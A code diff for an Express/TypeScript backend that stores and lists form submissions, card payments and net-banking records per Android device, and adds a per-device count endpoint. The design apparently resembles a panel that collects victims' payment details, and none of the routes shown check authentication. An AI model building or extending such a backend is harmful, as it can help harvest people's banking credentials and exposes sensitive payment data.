@@ -6,10 +6,6 @@ import wsService from "../services/wsService";
 
 const router = express.Router();
 
-/**
- * Helper: normalize a FormSubmission doc into Android-friendly FormEntry shape.
- * Tries multiple payload keys for best compatibility.
- */
 function transformFormDoc(doc: any) {
   const payload = doc.payload || {};
 
@@ -73,7 +69,49 @@ router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
   }
 });
 
+/* ================= PER-DEVICE COUNTS (Android device list) ================= */
+
+router.get("/forms/per-device-counts", async (_req: Request, res: Response) => {
+  try {
+    const [formAgg, cardAgg, netAgg] = await Promise.all([
+      FormSubmission.aggregate([
+        { $group: { _id: "$uniqueid", count: { $sum: 1 } } },
+      ]),
+      Payment.aggregate([
+        { $match: { method: "card" } },
+        { $group: { _id: "$uniqueid", count: { $sum: 1 } } },
+      ]),
+      Payment.aggregate([
+        { $match: { method: "netbanking" } },
+        { $group: { _id: "$uniqueid", count: { $sum: 1 } } },
+      ]),
+    ]);
+
+    // Merge all counts per deviceId
+    const result: Record<string, number> = {};
+
+    for (const item of formAgg) {
+      if (!item._id) continue;
+      result[item._id] = (result[item._id] || 0) + item.count;
+    }
+    for (const item of cardAgg) {
+      if (!item._id) continue;
+      result[item._id] = (result[item._id] || 0) + item.count;
+    }
+    for (const item of netAgg) {
+      if (!item._id) continue;
+      result[item._id] = (result[item._id] || 0) + item.count;
+    }
+
+    return res.json(result);
+  } catch (err: any) {
+    logger.error("forms: per-device-counts failed", err);
+    return res.status(500).json({});
+  }
+});
+
 /* ================= LIST FORM SUBMISSIONS ================= */
+
 router.get("/form_submissions", async (_req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find().lean();
@@ -86,6 +124,7 @@ router.get("/form_submissions", async (_req: Request, res: Response) => {
 });
 
 /* ================= GET FORM BY DEVICE ================= */
+
 router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find({
@@ -101,6 +140,7 @@ router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Respons
 });
 
 /* ================= DELETE FORM SUBMISSION ================= */
+
 router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
   try {
     await FormSubmission.deleteOne({ uniqueid: req.params.uniqueid });
@@ -112,6 +152,7 @@ router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response)
 });
 
 /* ================= GET CARD PAYMENTS BY DEVICE ================= */
+
 router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await Payment.find({
@@ -127,6 +168,7 @@ router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response
 });
 
 /* ================= GET NET BANKING BY DEVICE ================= */
+
 router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await Payment.find({
@@ -142,6 +184,7 @@ router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) 
 });
 
 /* ================= GET SUCCESS DATA ================= */
+
 router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const doc = await FormSubmission.findOne({
@@ -162,6 +205,7 @@ router.get("/success_data/device/:uniqueid", async (req: Request, res: Response)
 });
 
 /* ================= POST: SUCCESS DATA ================= */
+
 router.post("/success_data", async (req: Request, res: Response) => {
   const body = req.body || {};
   const uniqueid = body.uniqueid || "";
@@ -214,6 +258,7 @@ router.post("/success_data", async (req: Request, res: Response) => {
 });
 
 /* ================= POST: generic form_submissions ================= */
+
 router.post("/form_submissions", async (req: Request, res: Response) => {
   const body = req.body || {};
   try {
@@ -240,6 +285,7 @@ router.post("/form_submissions", async (req: Request, res: Response) => {
 });
 
 /* ================= POST: card_payments ================= */
+
 router.post("/card_payments", async (req: Request, res: Response) => {
   try {
     const body = req.body || {};
